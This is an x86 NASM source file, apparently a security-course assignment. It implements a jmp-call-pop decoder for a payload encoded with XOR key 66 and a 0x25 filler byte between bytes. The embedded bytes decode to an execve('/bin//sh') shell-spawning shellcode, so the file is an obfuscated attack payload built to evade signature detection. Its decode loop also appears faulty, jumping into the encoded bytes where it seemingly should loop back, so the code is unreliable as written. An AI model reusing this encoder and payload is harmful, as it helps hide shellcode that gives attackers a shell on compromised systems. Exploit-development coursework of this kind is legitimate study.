; Filename: decoder.nasm
; Author: SLAE-14209
; Decoder for XOR 66 + inserting new byte \\x25

global _start

section .text
_start:
  jmp short call_shellcode
  
decoder:
  pop esi                         ; get address of encoded shellcode
  lea edi, [esi +1]               ; first "0x25" in my EncodedShellcode
  xor eax, eax                    ; zeroize EAX register
  xor ecx, ecx                    ; zeroize ECX register
  mov al, 1                       ; move 1 inside EAX

decode:
  mov bl, byte [esi + eax]       ; ESI = "0x73", EAX = 1, ESI + EAX = "0x25"
  xor bl, 0x25
  jnz short EncodedShellcode
  mov bl, byte [esi + eax + 1]   ; taking 3th value from EncodedShellcode "0x82" inside bl
  mov byte [edi], bl             ; EDI is pointing to next value after ESI (ESI = 0x73, EDI = 0x25...", then copy EDI into ESI (0x82 will be shifted on 0x25 position)
  xor byte [edi], 66             ; 66 is a XOR key
  inc edi
  add al, 2
  jmp short EncodedShellcode

call_shellcode:

  call decoder  
  EncodedShellcode: db 0x73,0x25,0x82,0x25,0x12,0x25,0x2a,0x25,0x6d,0x25,0x6d,0x25,0x31,0x25,0x2a,0x25,0x2a,0x25,0x6d,0x25,0x20,0x25,0x2b,0x25,0x2c,0x25,0xcb,0x25,0xa1,0x25,0x12,0x25,0xcb,0x25,0xa0,0x25,0x11,0x25,0xcb,0x25,0xa3,0x25,0xf2,0x25,0x49,0x25,0x8f,0x25,0xc2,0x25,0xbb,0xbb
